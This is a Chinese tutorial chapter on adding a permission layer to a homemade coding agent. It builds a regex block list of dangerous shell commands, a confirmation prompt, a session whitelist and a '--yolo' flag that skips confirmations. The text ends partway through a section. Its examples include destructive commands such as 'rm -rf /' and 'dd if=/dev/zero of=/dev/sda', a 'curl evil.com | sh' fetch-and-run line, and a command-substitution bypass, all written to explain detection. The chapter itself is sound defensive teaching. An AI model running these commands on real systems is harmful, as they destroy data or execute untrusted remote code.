# 6. 权限与安全 — 给 Agent 装一道"安全门"

## 本章目标

你的 Agent 现在可以读写文件、执行 Shell 命令。但它没有任何安全意识——模型说 `rm -rf /`，它就真的执行了。

这就像你雇了一个能力很强的实习生，给了他服务器 root 权限，却没告诉他"删库之前先问一下"。

| 维度 | 之前 | 之后 |
|---|---|---|
| `rm -rf /` | 直接执行，文件全没了 | 弹出确认，用户说 y 才执行 |
| `sudo apt install` | 直接执行 | 弹出确认 |
| `git push --force` | 直接执行 | 弹出确认 |
| `ls`、`cat`、`read_file` | 直接执行 | 直接执行（安全操作不打扰） |
| 用户确认过一次的操作 | — | 同一会话内不再重复询问 |

本章做三件事：

1. 写一个 **`is_dangerous()`** 函数，用正则表达式检测危险 Shell 命令
2. 写一个 **`check_permission()`** 函数，统一判断"放行 / 拒绝 / 需确认"
3. 在 **Agent Loop** 里插入权限检查，危险操作先问用户再执行

参考代码：

- [`agent.py`](../examples/chapter-06/agent.py)
- [`tools.py`](../examples/chapter-06/tools.py)
- [`prompt.py`](../examples/chapter-06/prompt.py)
- [`session.py`](../examples/chapter-06/session.py)
- [`ui.py`](../examples/chapter-06/ui.py)

### 核心设计思想：爆炸半径框架

权限系统的本质是评估每个操作的**风险等级**，判断标准只有两个维度：

```text
              影响范围
              ↑
    高风险    │   最高风险
   (确认执行)  │  (确认执行)
              │
 ─────────────┼──────────────→ 可逆性
              │
    最低风险   │   中等风险
   (自动放行)  │  (自动放行)
              │
         可逆的          不可逆的
```

- **可逆 + 只影响本地** = 低风险（读文件、编辑文件）→ 自动放行
- **不可逆 + 影响共享系统** = 高风险（`rm -rf`、`git push --force`）→ 必须确认

这个框架已经写在 Ch3 的 system prompt 里（"Executing actions with care" 段落），本章在代码层面实现它。

### 暂时省略的能力

| 省略内容 | 原因 | 补回章节 |
|---|---|---|
| 可配置权限规则（settings.json） | 需要配置文件加载系统，当前先用硬编码 | Ch10 或后续进阶 |
| 5 种权限模式（plan/acceptEdits/bypassPermissions/dontAsk） | Plan Mode 在 Ch10 实现，其他模式依赖它 | Ch10 Plan Mode |
| Bash AST 分析（tree-sitter） | 需要额外依赖，正则够用 | 进阶阅读已介绍概念 |
| 新文件写入确认（write_file 到不存在的路径） | 先集中在 Shell 命令检测 | 可作为本章练习自行加入 |

---

## Step 1：认识正则表达式

> 文件：`tools.py`（添加）

在写 `is_dangerous()` 之前，先了解它依赖的工具——正则表达式。

### 什么是正则表达式

正则表达式是一种"模式描述语言"，用一串符号描述"我要找什么样的文本"。

类比：你在一堆文件里搜关键词，`Ctrl+F` 只能搜精确的字符串。正则表达式像一个升级版的 `Ctrl+F`——能搜"以 rm 开头的命令"、"包含 sudo 的行"这类模糊模式。

这里的"模式"英文就是 **pattern**——它不是一个具体的字符串，而是一个**规则**，描述"符合什么样子的文本算匹配"。比如"独立的 rm 后面跟空格"就是一个 pattern，`rm -rf /` 和 `rm file.txt` 都符合这个 pattern，但 `framework` 不符合。

### 常见正则符号速查表

Step 2 的代码会用到这些符号，先看一遍有个印象，后面碰到再回来查：

| 符号 | 含义 | 例子 | 匹配 | 不匹配 |
|---|---|---|---|---|
| `\b` | 单词边界 | `\brm` | `rm -rf`、`sudo rm` | `framework`（rm 不是独立单词） |
| `\s` | 一个空白字符（空格、Tab、换行） | `rm\s` | `rm -rf`（rm 后有空格） | `rm`（后面没东西） |
| `\s+` | 一个或多个空白字符 | `git\s+push` | `git push`、`git  push` | `gitpush` |
| `(a\|b\|c)` | 匹配 a 或 b 或 c 中的任意一个 | `(push\|reset)` | `push`、`reset` | `pull` |
| `.` | 任意一个字符 | `a.c` | `abc`、`a1c` | `ac` |
| `*` | 前面的东西出现 0 次或多次 | `ab*c` | `ac`、`abc`、`abbc` | `adc` |
| `+` | 前面的东西出现 1 次或多次 | `ab+c` | `abc`、`abbc` | `ac` |

### 怎么读一个 pattern

碰到 `\brm\s` 这样的 pattern，对照速查表一个符号一个符号拆：

```text
\b  →  单词边界（rm 必须是独立单词的开头）
r   →  字母 r
m   →  字母 m
\s  →  一个空格（rm 后面必须跟参数）
```

合起来就是："独立的 rm 后面跟空格"。`rm -rf /` 匹配，`framework` 不匹配（rm 前面有字母 f，不是单词边界）。Step 2 里的 16 个 pattern 都是这样拆的。

### `r"..."` — 原始字符串

Python 正常字符串里，`\b` 表示退格符，`\n` 表示换行——反斜杠有特殊含义。但正则里 `\b` 要表示"单词边界"，含义冲突了。

加上 `r` 前缀，Python 不再解释反斜杠，原样传给正则引擎：

```python
re.compile("\brm\s")     # 错：Python 把 \b 变成退格符，正则收到错误的东西
re.compile(r"\brm\s")    # 对：\b 原样传给正则，正确理解为"单词边界"
```

简单记：**写正则就加 `r`，固定搭配。**

### `re.compile()` — 编译 pattern

`re.compile()` 把规则字符串编译成一个 pattern 对象，编译一次后可以反复使用，不用每次重新解析：

```python
import re

pattern = re.compile(r"\brm\s")           # 编译一次
pattern.search("rm -rf /")               # 找到了 ✓
pattern.search("framework")              # 没找到 ✗（rm 不是独立单词）
```

---

## Step 2：写 `is_dangerous()` — 16 个正则检测危险命令

> 文件：`tools.py`（在文件开头的 `import` 区域加入 `import re`，然后在工具定义之前加入以下代码）

先把完整的 16 个危险模式写出来，再逐组解释：

```python
import re

# --- 危险命令检测 ---

DANGEROUS_PATTERNS = [
    # Unix 危险命令
    re.compile(r"\brm\s"),                                      # 删除文件
    re.compile(r"\bgit\s+(push|reset|clean|checkout\s+\.)"),    # 危险 git 操作
    re.compile(r"\bsudo\b"),                                    # 提权执行
    re.compile(r"\bmkfs\b"),                                    # 格式化磁盘
    re.compile(r"\bdd\s"),                                      # 低级磁盘写入
    re.compile(r">\s*/dev/"),                                   # 写入设备文件
    re.compile(r"\bkill\b"),                                    # 杀进程
    re.compile(r"\bpkill\b"),                                   # 按名杀进程
    re.compile(r"\breboot\b"),                                  # 重启
    re.compile(r"\bshutdown\b"),                                # 关机
    # Windows 危险命令
    re.compile(r"\bdel\s", re.IGNORECASE),                      # 删除文件
    re.compile(r"\brmdir\s", re.IGNORECASE),                    # 删除目录
    re.compile(r"\bformat\s", re.IGNORECASE),                   # 格式化磁盘
    re.compile(r"\btaskkill\s", re.IGNORECASE),                 # 杀进程
    re.compile(r"\bRemove-Item\s", re.IGNORECASE),              # PowerShell 删除
    re.compile(r"\bStop-Process\s", re.IGNORECASE),             # PowerShell 杀进程
]


def is_dangerous(command):
    """检查 shell 命令是否危险，返回 True/False"""
    return any(p.search(command) for p in DANGEROUS_PATTERNS)
```

### 逐组解释

**Unix 危险命令（前 10 个）：**

| 模式 | 匹配什么 | 为什么危险 |
|---|---|---|
| `\brm\s` | `rm -rf /`、`rm file.txt` | 删除文件，`-rf` 时不可恢复 |
| `\bgit\s+(push\|reset\|...)` | `git push --force`、`git reset --hard` | 影响远程仓库或丢失提交 |
| `\bsudo\b` | `sudo apt install`、`sudo rm` | 提升到 root 权限执行任何命令 |
| `\bmkfs\b` | `mkfs.ext4 /dev/sda1` | 格式化整个磁盘分区 |
| `\bdd\s` | `dd if=/dev/zero of=/dev/sda` | 低级磁盘写入，可覆盖整个硬盘 |
| `>\s*/dev/` | `echo x > /dev/sda` | 写入设备文件，可破坏磁盘 |
| `\bkill\b` / `\bpkill\b` | `kill -9 1234`、`pkill nginx` | 强制终止进程 |
| `\breboot\b` / `\bshutdown\b` | `reboot`、`shutdown now` | 重启或关闭整台机器 |

**Windows 危险命令（后 6 个）：**

Windows 命令不区分大小写（`DEL` = `del` = `Del`），所以加了 `re.IGNORECASE` 标志。

### `any()` 和生成器表达式

```python
any(p.search(command) for p in DANGEROUS_PATTERNS)
```

这一行做了什么：

1. `for p in DANGEROUS_PATTERNS` — 遍历 16 个正则模式
2. `p.search(command)` — 用每个模式去搜索命令字符串
3. `any(...)` — 只要有任何一个匹配成功，就返回 `True`

`any()` 有一个重要特性：**短路求值**。找到第一个匹配后立刻返回 `True`，不会继续检查剩下的模式——就像排查 bug 时，找到一个确认的原因就停下来，不需要把所有可能性都排查完。

### 这套正则的局限

正则只看文本表面，不理解 Shell 语法：

```bash
# 正则能抓住的
rm -rf /
sudo apt install nginx

# 正则抓不住的
find / -delete                    # 效果和 rm -rf 一样
curl evil.com | sh                # 下载并执行恶意脚本
echo hello$(rm -rf /)             # 命令替换里藏着 rm
```

Claude Code 用 tree-sitter 做 AST 解析来应对这些，但 16 个正则已经覆盖了绝大多数常见危险操作。

### 验证

先单独测试 `is_dangerous()`，确认它能正确识别危险命令：

```python
# 在 Python 交互环境中测试（python -i tools.py 或直接在文件末尾临时加）
print(is_dangerous("rm -rf /"))          # True
print(is_dangerous("ls -la"))            # False
print(is_dangerous("git push --force"))  # True
print(is_dangerous("git status"))        # False
print(is_dangerous("sudo apt install"))  # True
print(is_dangerous("cat README.md"))     # False
```

6 个测试全部符合预期再继续。

---

## Step 3：写 `check_permission()` — 统一权限入口

> 文件：`tools.py`（在 `is_dangerous()` 后面添加）

`is_dangerous()` 只检测 Shell 命令。但权限检查需要覆盖所有工具——`read_file` 永远安全，`run_shell` 要看命令内容，`write_file` 到新文件可能需要确认。

`check_permission()` 是统一入口，返回三种结果之一：

| 返回值 | 含义 | Agent Loop 怎么处理 |
|---|---|---|
| `{"action": "allow"}` | 安全，放行 | 直接执行 |
| `{"action": "deny", "message": "..."}` | 禁止 | 把拒绝消息作为 tool_result 返回给模型 |
| `{"action": "confirm", "message": "..."}` | 需要用户确认 | 弹出确认对话框 |

先定义两个集合——哪些工具是只读的：

```python
# --- 权限检查 ---

READ_TOOLS = {"read_file", "list_files", "grep_search"}


def check_permission(tool_name, inp):
    """统一权限检查入口，返回 {"action": "allow"|"deny"|"confirm", "message": ...}"""
    # 只读工具永远安全
    if tool_name in READ_TOOLS:
        return {"action": "allow"}

    # Shell 命令：检查是否危险
    if tool_name == "run_shell":
        command = inp.get("command", "")
        if is_dangerous(command):
            return {"action": "confirm", "message": command}

    # 其他工具（write_file, edit_file）：当前版本默认放行
    return {"action": "allow"}
```

### `set()` 是什么

`{"read_file", "list_files", "grep_search"}` 是一个**集合（set）**。和列表的区别：

```python
# 列表：用 [] 创建，可以有重复元素，按顺序存储
tools_list = ["read_file", "list_files", "read_file"]  # 3 个元素

# 集合：用 {} 创建，不允许重复，无序存储
tools_set = {"read_file", "list_files", "read_file"}   # 2 个元素（重复的被去掉）
```

集合的 `in` 查找是 O(1)（常数时间），列表是 O(n)（要逐个比较）。虽然这里只有 3 个元素差别不大，但用集合更准确地表达了语义："这是一组不重复的标签，我只关心某个元素在不在里面"。

### 为什么返回字典而不是字符串

返回 `{"action": "confirm", "message": "rm -rf /"}` 而不是单纯的 `"confirm"`，是因为调用方需要知道两件事：

1. **做什么**（action）——放行、拒绝还是确认
2. **为什么**（message）——给用户看的描述，也用作白名单的 key

### 验证

```python
print(check_permission("read_file", {"file_path": "test.py"}))
# {"action": "allow"}

print(check_permission("run_shell", {"command": "ls -la"}))
# {"action": "allow"}

print(check_permission("run_shell", {"command": "rm -rf /"}))
# {"action": "confirm", "message": "rm -rf /"}

print(check_permission("write_file", {"file_path": "x.py", "content": "hi"}))
# {"action": "allow"}
```

---

## Step 4：写确认对话框 `print_confirmation()`

> 文件：`ui.py`（添加）

当 `check_permission()` 返回 `"confirm"` 时，需要在终端显示一个醒目的确认提示，让用户看清楚要执行什么命令。

在 `ui.py` 末尾添加：

```python
def print_confirmation(command):
    """显示危险命令确认提示"""
    console.print(f"\n  [bold red]Dangerous command detected:[/bold red]")
    console.print(f"  [yellow]{command}[/yellow]")
```

这个函数只负责**显示**，不负责读取用户输入——输入的部分放在 `agent.py` 里，因为那是对话循环的职责。

显示效果：

```text
  Dangerous command detected:
  rm -rf /tmp/test
```

红色标题 + 黄色命令，让用户一眼看到要执行的内容。

---

## Step 5：在 Agent Loop 中集成权限检查

> 文件：`agent.py`（修改）

这是本章最关键的一步。目前你的 agent loop 里，工具调用是这样的：

```python
# 之前：无条件执行
result = execute_tool(block.name, block.input)
```

现在要在执行之前插入权限检查：

```text
模型返回 tool_use
    ↓
check_permission(name, input)
    ↓
  allow → 直接执行
  deny  → 跳过执行，把拒绝消息作为 tool_result 返回给模型
  confirm → 弹确认 → 用户说 y → 执行
                    → 用户说 n → 把拒绝消息作为 tool_result 返回给模型
```

### 5.1 添加导入

在 `agent.py` 开头的导入区域，修改 `from tools import ...` 这行：

```python
from tools import tool_definitions, execute_tool, check_permission
from ui import print_confirmation, print_info
```

如果你还没有用 `ui.py` 的函数（比如还停留在 Ch2 的版本），可以先不导入 `ui` 相关的，用 `print()` 代替。

### 5.2 添加会话白名单

在 Agent 类的 `__init__` 中（如果你用的是 Ch5 的 Agent 类），或者在全局变量区域（如果你还在用 Ch2 的 while 循环版本），添加一个集合来记住用户已经确认过的操作：

**如果你用的是 Agent 类（Ch5 版本）：**

```python
class Agent:
    def __init__(self, ...):
        # ... 已有的初始化代码 ...
        self._confirmed_commands = set()   # 会话级白名单
```

**如果你还在用 while 循环版本（Ch2 版本）：**

```python
confirmed_commands = set()   # 放在 while True 之前
```

### 会话白名单的作用

用户确认了 `npm test` 一次后，同一个会话里再次遇到 `npm test` 就不用再问了——加入 `_confirmed_commands` 集合即可。

注意这是**会话级**的——退出程序后白名单清空。这是安全考虑：上次你允许了 `rm temp/`，不代表下次你还想允许。

### 5.3 修改工具执行逻辑

找到你处理 `tool_use` 的代码块，把无条件执行改成带权限检查的版本。

**如果你用的是 Agent 类（Ch5 版本），修改 `chat()` 方法中的 tool_use 处理：**

```python
elif block.type == "tool_use":
    assistant_content.append({
        "type": "tool_use", "id": block.id,
        "name": block.name, "input": block.input,
    })
    print_tool_call(block.name, block.input)

    # --- 权限检查（新增） ---
    perm = check_permission(block.name, block.input)

    if perm["action"] == "deny":
        # 被拒绝：把拒绝消息作为工具结果返回给模型
        print_info(f"Denied: {perm.get('message', '')}")
        tool_results.append({
            "type": "tool_result",
            "tool_use_id": block.id,
            "content": f"Action denied: {perm.get('message', '')}",
        })
        continue  # 跳过执行，处理下一个 block

    if perm["action"] == "confirm":
        msg = perm.get("message", "")
        if msg not in self._confirmed_commands:
            # 需要确认且未曾授权
            print_confirmation(msg)
            try:
                answer = input("  Allow? (y/n): ")
            except EOFError:
                answer = "n"
            if not answer.lower().startswith("y"):
                # 用户拒绝
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": block.id,
                    "content": "User denied this action.",
                })
                continue
            # 用户同意，加入白名单
            self._confirmed_commands.add(msg)

    # --- 正常执行 ---
    result = execute_tool(block.name, block.input)
    print_tool_result(block.name, result)
    tool_results.append({
        "type": "tool_result",
        "tool_use_id": block.id,
        "content": result,
    })
```

**如果你还在用 while 循环版本（Ch2 版本），同样的逻辑：**

```python
elif block.type == "tool_use":
    assistant_content.append({
        "type": "tool_use", "id": block.id,
        "name": block.name, "input": block.input,
    })

    # --- 权限检查 ---
    perm = check_permission(block.name, block.input)

    if perm["action"] == "deny":
        print(f"Denied: {perm.get('message', '')}")
        tool_results.append({
            "type": "tool_result",
            "tool_use_id": block.id,
            "content": f"Action denied: {perm.get('message', '')}",
        })
        continue

    if perm["action"] == "confirm":
        msg = perm.get("message", "")
        if msg not in confirmed_commands:
            print(f"\n  Dangerous command: {msg}")
            answer = input("  Allow? (y/n): ")
            if not answer.lower().startswith("y"):
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": block.id,
                    "content": "User denied this action.",
                })
                continue
            confirmed_commands.add(msg)

    result = execute_tool(block.name, block.input)
    tool_results.append({
        "type": "tool_result",
        "tool_use_id": block.id,
        "content": result,
    })
```

### 关键设计：拒绝是 tool_result，不是异常

注意：不管是 `deny` 还是用户说 `n`，我们都把拒绝消息作为 `tool_result` 返回给模型，而不是抛异常或中断循环。

为什么？因为模型看到 `"User denied this action."` 后，会**调整策略**——比如换一个更安全的命令、或者直接告诉用户"这个操作需要你手动执行"。如果我们抛异常中断了循环，模型就没有机会做出调整。

```text
模型: 我来执行 rm -rf /tmp/old
用户: n（拒绝）
模型收到: "User denied this action."
模型: 好的，那我改用 rm /tmp/old/specific_file.txt 只删除那一个文件
```

### `continue` 是什么

`continue` 的意思是"跳过当前这次循环的剩余代码，直接进入下一次循环"。

在 `for block in response.content:` 循环里，`continue` 跳过当前 block 的执行（`execute_tool`），直接处理下一个 block。这样被拒绝的工具调用不会被执行，但后续的工具调用仍然正常处理。

### `dict.get()` 的默认值

```python
perm.get("message", "")
```

`dict.get(key, default)` 在 key 不存在时返回 default，而不是报错。`perm["message"]` 在 key 不存在时会抛 `KeyError`。当 action 是 `"allow"` 时字典里没有 `"message"` 键，所以用 `.get()` 更安全。

---

## Step 6：升级命令行参数 — argparse + --model + model 恢复

> 文件：`agent.py`（修改启动逻辑）

Ch4 用 `sys.argv` 手动检查 `--resume`，够用但不好扩展。现在需要加 `--yolo`（跳过权限确认）和 `--model`（指定模型），参数越来越多，升级到 Python 标准库的 `argparse`。

### 先学一个 Python 工具：argparse

`argparse` 帮你定义命令行参数、自动生成 `--help`、自动校验输入：

```python
import argparse

parser = argparse.ArgumentParser(prog="mini-claude")

# 位置参数（可选，可以有多个词）
parser.add_argument("prompt", nargs="*")
# nargs="*" 表示"零个或多个"，结果是列表：["fix", "bug"] 或 []

# 开关参数（有就是 True，没有就是 False）
parser.add_argument("--resume", action="store_true")
# --resume → args.resume = True；不写 → args.resume = False

# 带值参数（后面跟一个值）
parser.add_argument("--model", "-m", default=None)
# --model gpt-4o → args.model = "gpt-4o"；不写 → args.model = None
# -m 是 --model 的缩写

args = parser.parse_args()
```

```bash
# 命令行使用示例
python agent.py "fix bug"              # args.prompt = ["fix", "bug"]
python agent.py --resume               # args.resume = True
python agent.py --model gpt-4o "hello" # args.model = "gpt-4o", args.prompt = ["hello"]
python agent.py --yolo "delete files"  # args.yolo = True
python agent.py --help                 # 自动打印参数说明
```

### 改写 main()

把 Ch4 的手动 `sys.argv` 替换成 `argparse`，同时加入 `--model` 和 `--yolo`：

```python
import argparse
import asyncio
import os
import sys

from session import load_session, get_latest_session_id
from ui import print_info


def parse_args():
    parser = argparse.ArgumentParser(prog="mini-claude")
    parser.add_argument("prompt", nargs="*")
    parser.add_argument("--resume", action="store_true")
    parser.add_argument("--model", "-m", default=None)
    parser.add_argument("--yolo", "-y", action="store_true")
    return parser.parse_args()


def main():
    args = parse_args()

    api_key = os.environ.get("DEEPSEEK_API_KEY")
    if not api_key:
        print("Error: DEEPSEEK_API_KEY not set")
        sys.exit(1)

    # --model 优先，否则用默认值
    model = args.model or "claude-sonnet-4.6"

    agent = Agent(
        api_key=api_key,
        base_url="https://api.deepseek.com/anthropic",
        model=model,
        yolo=args.yolo,
    )

    # --resume：恢复上次会话
    if args.resume:
        session_id = get_latest_session_id()
        if session_id:
            session = load_session(session_id)
            if session:
                agent.restore_session(session)
        else:
            print_info("No previous sessions found.")

    prompt = " ".join(args.prompt) if args.prompt else None

    if prompt:
        asyncio.run(agent.chat(prompt))
    else:
        asyncio.run(run_repl(agent))
```

### --yolo 模式

`--yolo` 跳过所有权限确认，危险命令直接执行。在 `__init__` 里加一个标志：

```python
class Agent:
    def __init__(self, *, api_key, base_url=None, model="claude-sonnet-4.6", yolo=False):
        # ... 已有的初始化 ...
        self.yolo = yolo
        self._confirmed_commands = set()
```

然后在 Step 5 的权限检查逻辑里，`yolo` 模式跳过确认：

```python
# 在 agent.py 的 tool_use 处理里
perm = check_permission(block.name, block.input)

if perm["action"] == "confirm" and not self.yolo:
    # ... 原来的确认逻辑 ...
```

`self.yolo` 为 `True` 时，`confirm` 类型的权限检查直接跳过，等于全部放行。

### resume 时有条件恢复 model

Ch4 里 `restore_session` 没有恢复 model。现在有了 `--model` 参数，逻辑是：**用户指定了就用用户的，没指定就恢复上次的**。

```python
def restore_session(self, data, user_specified_model=False):
    messages = data.get("messages")
    if not messages:
        return
    self.messages = messages
    metadata = data.get("metadata", {})
    # 恢复 session_id，让后续 _auto_save() 写回同一个文件
    if metadata.get("id"):
        self.session_id = metadata["id"]
    if metadata.get("startTime"):
        self.session_start_time = metadata["startTime"]
    # 恢复 token 计数，让 /cost 显示累计用量
    self.total_input_tokens = metadata.get("totalInputTokens", 0)
    self.total_output_tokens = metadata.get("totalOutputTokens", 0)
    # 恢复 model：用户没指定就用上次的，指定了就用用户的
    if not user_specified_model and metadata.get("model"):
        self.model = metadata["model"]
    print_info(
        f"Session restored ({len(self.messages)} messages)."
    )
```

调用时把"用户是否指定了 model"传进去：

```python
if args.resume:
    session_id = get_latest_session_id()
    if session_id:
        session = load_session(session_id)
        if session:
            agent.restore_session(
                session,
                user_specified_model=args.model is not None,
            )
```

`args.model is not None` — 用户写了 `--model xxx` 就是 `True`，没写就是 `False`（用 `argparse` 的 `default=None`）。

这跟 Claude Code 的逻辑一致：

```typescript
// Claude Code: sessionRestore.ts
// Apply agent's model if user didn't specify one
if (!getMainLoopModelOverride() && resumedAgent.model) {
    setMainLoopModelOverride(resumedAgent.model)
}
```

---

## Step 7：测试权限系统

运行你的 Agent，依次测试这些场景：

### 测试 1：安全命令直接执行

```text
> 运行 ls 看看当前目录有什么文件
```

预期：模型调用 `run_shell("ls")`，直接执行，没有确认提示。

### 测试 2：危险命令弹确认

```text
> 帮我删除 /tmp/test_dir 这个目录
```

预期：模型调用 `rm` 相关命令，弹出确认提示：

```text
  Dangerous command detected:
  rm -rf /tmp/test_dir
  Allow? (y/n):
```

输入 `n`，观察模型是否调整策略（比如建议你手动删除，或者问你是否确定）。

### 测试 3：只读工具不受影响

```text
> 读一下 agent.py
```

预期：`read_file` 直接执行，没有任何确认提示。

### 测试 4：白名单生效

```text
> 帮我查看系统进程
```

如果模型用了 `kill` 或 `pkill`，确认一次后，同一会话内再次遇到相同命令不会重复询问。

### 测试 5：拒绝后模型调整

```text
> 帮我执行 sudo apt update
```

弹出确认后输入 `n`。观察模型的回复——它应该看到 `"User denied this action."` 后，告诉你需要手动执行或者提供替代方案。

---

## 回头看

本章只加了三个函数和一段逻辑，但安全性有了质的提升：

```text
之前：
  模型返回 tool_use → execute_tool() → 无条件执行

之后：
  模型返回 tool_use → check_permission() → allow?  → execute_tool()
                                          → deny?   → 返回拒绝消息给模型
                                          → confirm? → 问用户 → y → 加入白名单 → execute_tool()
                                                              → n → 返回拒绝消息给模型
```

文件变化：

| 文件 | 改了什么 |
|---|---|
| `tools.py` | 加了 `DANGEROUS_PATTERNS`、`is_dangerous()`、`check_permission()` |
| `ui.py` | 加了 `print_confirmation()` |
| `agent.py` | 权限检查 + 会话白名单 + `--yolo` + `argparse` + `--model` + resume 恢复 model |

学到的 Python 概念：

| 概念 | 用在哪里 |
|---|---|
| `re.compile()` + `\b` + `\s` | 危险命令正则模式 |
| `any()` + 生成器表达式 | `is_dangerous()` 里遍历 16 个模式 |
| `set()` + `in` + `.add()` | `READ_TOOLS` 集合和 `_confirmed_commands` 白名单 |
| `dict.get(key, default)` | 安全取字典值 |
| `continue` | 跳过被拒绝的工具执行 |
| `argparse` | 命令行参数解析（`--resume`、`--model`、`--yolo`） |

---

## 完整参考代码

> 自己先写，卡住再看。

### tools.py（权限相关部分，加在已有代码之前）

```python
import os
import re
import subprocess


# --- 危险命令检测 ---

DANGEROUS_PATTERNS = [
    re.compile(r"\brm\s"),
    re.compile(r"\bgit\s+(push|reset|clean|checkout\s+\.)"),
    re.compile(r"\bsudo\b"),
    re.compile(r"\bmkfs\b"),
    re.compile(r"\bdd\s"),
    re.compile(r">\s*/dev/"),
    re.compile(r"\bkill\b"),
    re.compile(r"\bpkill\b"),
    re.compile(r"\breboot\b"),
    re.compile(r"\bshutdown\b"),
    re.compile(r"\bdel\s", re.IGNORECASE),
    re.compile(r"\brmdir\s", re.IGNORECASE),
    re.compile(r"\bformat\s", re.IGNORECASE),
    re.compile(r"\btaskkill\s", re.IGNORECASE),
    re.compile(r"\bRemove-Item\s", re.IGNORECASE),
    re.compile(r"\bStop-Process\s", re.IGNORECASE),
]


def is_dangerous(command):
    """检查 shell 命令是否包含危险操作"""
    return any(p.search(command) for p in DANGEROUS_PATTERNS)


# --- 权限检查 ---

READ_TOOLS = {"read_file", "list_files", "grep_search"}


def check_permission(tool_name, inp):
    """统一权限检查，返回 {"action": "allow"|"deny"|"confirm", "message": ...}"""
    if tool_name in READ_TOOLS:
        return {"action": "allow"}

    if tool_name == "run_shell":
        command = inp.get("command", "")
        if is_dangerous(command):
            return {"action": "confirm", "message": command}

    return {"action": "allow"}


# --- 工具定义（给模型看的说明书） ---
# ... 你 Ch2 写的 read_file_tool 等定义，保持不变 ...
```

### ui.py（新增部分，加在已有函数后面）

```python
def print_confirmation(command):
    """显示危险命令确认提示"""
    console.print(f"\n  [bold red]Dangerous command detected:[/bold red]")
    console.print(f"  [yellow]{command}[/yellow]")
```

### agent.py（工具执行部分，只展示修改的核心逻辑）

Agent 类版本（Ch5 基础上修改）：

```python
from tools import tool_definitions, execute_tool, check_permission
from ui import (print_welcome, print_user_prompt, print_assistant_text,
                print_tool_call, print_tool_result, print_error, print_info,
                print_confirmation, start_spinner, stop_spinner)


class Agent:
    def __init__(self, *, api_key, base_url=None, model="claude-sonnet-4.6"):
        # ... 已有的初始化 ...
        self._confirmed_commands = set()

    async def chat(self, user_message):
        self.messages.append({
            "role": "user",
            "content": [{"type": "text", "text": user_message}],
        })
        while True:
            start_spinner()
            response = await self._call_stream()
            stop_spinner()

            self.total_input_tokens += response.usage.input_tokens
            self.total_output_tokens += response.usage.output_tokens

            assistant_content = []
            tool_results = []
            for block in response.content:
                if block.type == "text":
                    assistant_content.append({
                        "type": "text", "text": block.text,
                    })
                elif block.type == "tool_use":
                    assistant_content.append({
                        "type": "tool_use", "id": block.id,
                        "name": block.name, "input": block.input,
                    })
                    print_tool_call(block.name, block.input)

                    # 权限检查
                    perm = check_permission(block.name, block.input)

                    if perm["action"] == "deny":
                        print_info(f"Denied: {perm.get('message', '')}")
                        tool_results.append({
                            "type": "tool_result",
                            "tool_use_id": block.id,
                            "content": f"Action denied: {perm.get('message', '')}",
                        })
                        continue

                    if perm["action"] == "confirm":
                        msg = perm.get("message", "")
                        if msg not in self._confirmed_commands:
                            print_confirmation(msg)
                            try:
                                answer = input("  Allow? (y/n): ")
                            except EOFError:
                                answer = "n"
                            if not answer.lower().startswith("y"):
                                tool_results.append({
                                    "type": "tool_result",
                                    "tool_use_id": block.id,
                                    "content": "User denied this action.",
                                })
                                continue
                            self._confirmed_commands.add(msg)

                    result = execute_tool(block.name, block.input)
                    print_tool_result(block.name, result)
                    tool_results.append({
                        "type": "tool_result",
                        "tool_use_id": block.id,
                        "content": result,
                    })

            self.messages.append({
                "role": "assistant", "content": assistant_content,
            })
            if tool_results:
                self.messages.append({
                    "role": "user", "content": tool_results,
                })
            else:
                break

        self._auto_save()
```

---

## 本章完成检查

- [ ] `tools.py`：`DANGEROUS_PATTERNS` 列表包含 16 个编译好的正则
- [ ] `tools.py`：`is_dangerous("rm -rf /")` 返回 `True`，`is_dangerous("ls")` 返回 `False`
- [ ] `tools.py`：`check_permission("read_file", ...)` 返回 `{"action": "allow"}`
- [ ] `tools.py`：`check_permission("run_shell", {"command": "rm -rf /"})` 返回 `{"action": "confirm", ...}`
- [ ] `ui.py`：`print_confirmation()` 能显示红色警告 + 黄色命令
- [ ] `agent.py`：危险命令弹出确认，输入 `n` 后模型收到拒绝消息并调整策略
- [ ] `agent.py`：安全命令（`ls`、`read_file`）直接执行不弹确认
- [ ] `agent.py`：同一命令确认一次后，会话内不再重复询问

---

## 暂时省略的能力

| 省略了什么 | 为什么省略 | 哪一章补回 | 补回后对齐参考实现的哪个能力 |
|---|---|---|---|
| 可配置权限规则（settings.json 的 allow/deny） | 需要文件加载 + 规则解析 + 匹配系统 | Ch10 或后续进阶 | `tools.py` 的 `load_permission_rules()` + `_check_permission_rules()` |
| 其他权限模式（plan/acceptEdits/dontAsk） | Plan Mode 在 Ch10，其他模式依赖它。`--yolo`（bypassPermissions）已在本章实现 | Ch10 Plan Mode | `check_permission()` 的 `mode` 参数 |
| 新文件写入确认（write_file 到不存在的路径） | 先聚焦 Shell 命令检测 | 可作为本章练习自行加入 | `check_permission()` 中 `write_file` + `not exists()` 分支 |
| Bash AST 分析（tree-sitter） | 需要额外依赖，正则够用 | 不补回（复杂度与收益不匹配） | Claude Code Layer 4 |
| 拒绝追踪（连续拒绝 3 次降级，总拒绝 20 次中止） | 需要状态计数器，当前用户量级不需要 | 可作为进阶练习 | `agent.py` 的 `_denial_count` |

---

## Claude Code 的做法（进阶阅读）

> 以下对照参考实现 `python/mini_claude/` 和 Claude Code 源码，第一遍可以跳过。

### 7 层纵深防御

Claude Code 在真实环境执行代码，安全机制采用**纵深防御（Defense in Depth）**：7 个独立安全层，即使某一层被绕过，其他层仍然有效。

| 层 | 机制 | Claude Code | 我们的版本 |
|----|------|-------------|-----------|
| 1 | Trust Dialog | 首次进入目录时确认信任 | 未实现 |
| 2 | 权限模式 | 5 种模式切换（default/plan/acceptEdits/bypassPermissions/dontAsk） | 简化（仅 default 模式） |
| 3 | 权限规则匹配 | 8 种来源、deny 优先、前缀/通配符匹配 | 未实现（Ch10 补回） |
| 4 | Bash AST 分析 | tree-sitter 解析，23 项静态检查，FAIL-CLOSED | 正则匹配（16 个模式） |
| 5 | 工具级验证 | validateInput + checkPermissions，保护 .git/ 等路径 | 基础检查（只读工具判断） |
| 6 | 沙箱隔离 | macOS Seatbelt / Linux namespace | 未实现 |
| 7 | 用户确认 | 对话框 + Hook + ML 分类器竞速 | 简单 input() 确认 |

### 为什么 Layer 4 不用正则

Shell 语法比看上去复杂得多。正则看到的是**文本表面**：

```bash
echo hello$(rm -rf /)
```

